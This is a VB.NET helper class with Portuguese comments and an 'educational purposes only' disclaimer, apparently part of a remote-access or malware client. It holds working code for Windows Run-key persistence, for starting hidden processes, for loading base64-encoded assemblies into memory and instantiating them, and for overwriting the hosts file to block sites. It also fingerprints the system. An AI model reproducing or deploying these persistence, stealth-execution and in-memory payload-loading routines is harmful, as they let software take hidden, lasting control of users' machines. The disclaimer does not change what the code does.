﻿

Imports System.IO
Imports System.Text 'Imports
Imports System.Reflection
Imports Microsoft.Win32
Imports Microsoft.MicrosoftClass.Microsoft

'!!!!!!!!!!!! Atenção codigo feito com propócito educativo !!!!!!!!!!!!!!
'!!!!!!!!!!!! Não me responsabiliso pelos seus atos !!!!!!!!!!!!!!!!!!!!!
'!!!!!!!!!!!! Apenas para proposito educativos "educacionais" '!!!!!!!!!!
'!!!!!!!!!!!! Use de forma correta perante a lei! Por favor !!!!!!!!!!!!!

Namespace AmaisClass
    Public Class Amais

#Region "Base64"
        Public Shared Function Base64(b As Byte()) As String
            Try
                Return Convert.ToBase64String(b)
            Catch ex As Exception
            End Try
            Return (String.Empty)
        End Function

        Public Shared Function Base64(s As String) As Byte()
            Try
                Return Convert.FromBase64String(s)
            Catch ex As Exception
            End Try
            Return (New Byte() {})
        End Function

        Public Shared Function BaseSplit(s As String)
            Try
                Dim B As Byte() = Base64(s.Replace(Separador, String.Empty))
                Return Encoding.UTF8.GetString(B)
            Catch ex As Exception
            End Try
            Return (String.Empty)
        End Function
#End Region

        Public Shared Function Encod(Dll As String, Enc As String) As Encoding
            Try
                Dim Result As Object = DLLInvoke(Dll).Encod(CType(Enc, Integer))
                Dim c As Encoding = CType(Result, Encoding)
                Return c
            Catch ex As Exception
                Return Encoding.UTF8
            End Try
        End Function

        Public Shared Sub ADDWindowsRunOrDelete(Nome As String, Caminho As String,
                                         CaminhoFile As String, ADDOrDelete As Boolean,
                                         UserOrMachine As Boolean)

            Try
                Dim x As RegistryKey = Nothing

                If (UserOrMachine) Then
                    x = Registry.CurrentUser.OpenSubKey(Caminho, True)
                Else
                    x = Registry.LocalMachine.OpenSubKey(Caminho, True)
                End If

                If (ADDOrDelete) Then
                    Call x.SetValue(Nome, CaminhoFile)
                Else
                    Call x.DeleteValue(Nome)
                End If

                Call x.Close()
                Call x.Dispose()
            Catch ex As Exception

            End Try
        End Sub

        Public Shared Function Ler(S As String, Encoder As Encoding) As String
            Try
                Dim x As New StreamReader(S, Encoder)
                Dim Save As String = x.ReadToEnd
                Call x.Close()
                Call x.Dispose()
                Return Save
            Catch ex As Exception

            End Try
            Return String.Empty
        End Function

        Public Shared Sub EscreverOuCriar(S As String, Dados As String, Encoder As Encoding, Apagar As Boolean)
            Try
                Dim x As New StreamWriter(S, Apagar, Encoder)
                Call x.Write(Dados)
                Call x.Close()
                Call x.Dispose()
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub Criar(S As String, Dados As Byte())
            Try
                Dim x As New FileStream(S, FileMode.Create, FileAccess.ReadWrite)
                Call x.Write(Dados, 0, Dados.Length)
                Call x.Close()
                Call x.Dispose()
            Catch ex As Exception
            End Try
        End Sub

        Public Shared Sub SiteBlock(s As String) 'requered admin mode
            Try
                Dim Sites As String = String.Empty
                Dim Total() As String = Split(s, "%%")
                For x As Integer = 0 To Total.Count - 2
                    Sites &= ("127.0.0.1 " & Total(x) & vbNewLine)
                Next x
                Dim Host As String = (System32 & "\drivers\etc\hosts").ToString
                Call EscreverOuCriar(Host, Sites, Encoding.Default, False)
            Catch ex As Exception

            End Try
        End Sub

        Public Shared Sub Cmd(FolderD As String, NameD As String, Argumentos As String, HideOrNot As Boolean) 'executar varios comandos no cmd
            Dim P As New ProcessStartInfo
            P.WorkingDirectory = FolderD
            P.FileName = NameD
            P.Arguments = Argumentos

            If (HideOrNot) Then
                P.WindowStyle = ProcessWindowStyle.Hidden
                P.CreateNoWindow = True
            Else
                P.WindowStyle = ProcessWindowStyle.Normal
            End If

            Dim P2 As New Process
            P2.StartInfo = P
            P2.EnableRaisingEvents = True

            AddHandler P2.Exited, (Sub(sender As Object, e As EventArgs)
                                       'close
                                       Call P2.Close()
                                       Call P2.Dispose()

                                       'set
                                       P2 = Nothing
                                   End Sub)
            Call P2.Start() 'start

            'set
            P = Nothing
        End Sub

        Public Shared Function DLLInvoke(S As String) As Object
            Return Blugin(Base64(S), "Class1")
        End Function

        Public Shared Function Blugin(B() As Byte, ClassName As String) As Object
            Try
                Dim X As Assembly = Assembly.Load(B)
                Return X.CreateInstance(Split(X.FullName, ",")(0) & "." & ClassName)
            Catch ex As Exception
            End Try
            Return Nothing
        End Function

        Public Shared Function Data_de_estalasao() As String
            Try
                Dim hoje As String = (Date.Today.ToString("dd/MM/yyyy"))
                Dim File_ As String = (Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Save.txt")
                If (File.Exists(File_)) Then
                    hoje = (File.ReadAllText(File_))
                Else
                    Call File.WriteAllText(File_, hoje)
                End If
                Return hoje '("dd-MM-yyyy")  'dia = dd / Mez = MM /ano = yyyy 
            Catch ex As Exception
            End Try
            Return "Erro!"
        End Function

        Public Shared Function Bits() As String
            Try
                If (Environment.Is64BitOperatingSystem) Then
                    Return "64 Bits"
                Else
                    Return "32 Bits"
                End If
            Catch ex As Exception
            End Try
            Return "Erro!"
        End Function

        Public Shared Function RAM() As String
            Try
                Dim Rans As ULong = CType(My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024, ULong)
                Return Rans.ToString
            Catch ex As Exception
            End Try
            Return "Erro!"
        End Function

    End Class

End Namespace